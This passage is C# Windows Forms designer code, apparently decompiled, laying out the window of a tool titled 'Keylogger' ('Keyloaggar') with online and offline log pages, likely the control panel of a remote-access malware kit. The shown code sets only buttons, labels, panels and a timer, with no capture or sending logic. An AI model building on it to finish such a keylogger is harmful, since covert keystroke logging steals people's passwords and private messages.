        this.LoaderConnect.RingStyle = Bunifu.UI.WinForms.BunifuLoader.RingStyles.Dashed;
        this.LoaderConnect.ShowText = false;
        this.LoaderConnect.Size = new System.Drawing.Size(57, 50);
        this.LoaderConnect.Speed = 7;
        this.LoaderConnect.TabIndex = 607;
        this.LoaderConnect.Text = "bunifuLoader1";
        this.LoaderConnect.TextPadding = new System.Windows.Forms.Padding(0);
        this.LoaderConnect.Thickness = 6;
        this.LoaderConnect.Transparent = true;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(678, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(630, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(654, 13);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(61, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Keylogger";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 494);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(405, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 286);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(405, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(728, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 286);
        this.PanelRight.TabIndex = 591;
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(762, 529);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "Keyloaggar";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Keyloaggar";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Keyloaggar_FormClosing);
        base.Load += new System.EventHandler(Keyloaggar_Load);
        base.Shown += new System.EventHandler(Keyloaggar_Shown);
        this.panelForm.ResumeLayout(false);
        this.PaneControll.ResumeLayout(false);
        this.PageKeyloaggar.ResumeLayout(false);
        this.PageOnlien.ResumeLayout(false);
        this.PageOnlien.PerformLayout();
        this.toolStrip1.ResumeLayout(false);
        this.toolStrip1.PerformLayout();
        this.PageOfflien.ResumeLayout(false);
        this.PageOfflien.PerformLayout();
        this.toolStrip2.ResumeLayout(false);
        this.toolStrip2.PerformLayout();
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
